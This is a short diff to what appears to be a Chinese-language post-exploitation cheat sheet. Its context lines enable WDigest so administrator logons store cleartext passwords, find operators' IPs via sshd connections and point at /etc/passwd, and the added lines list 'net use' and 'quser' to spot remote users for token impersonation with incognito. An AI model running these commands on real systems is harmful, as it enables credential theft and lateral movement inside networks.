@@ -29,6 +29,10 @@ netstat -lantp | grep ESTABLISHED # 关注sshd进程，即运维人员公司IP
 
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # 管理员登录可读明文
 
+net use # 查看网络连接
+quser   # 查看远程连接过来的用户 配合incognito, 再 net use
+net use 
+
 # -- linux
 ## 无curl, wget下载文件 tools_get.sh
 /etc/passwd
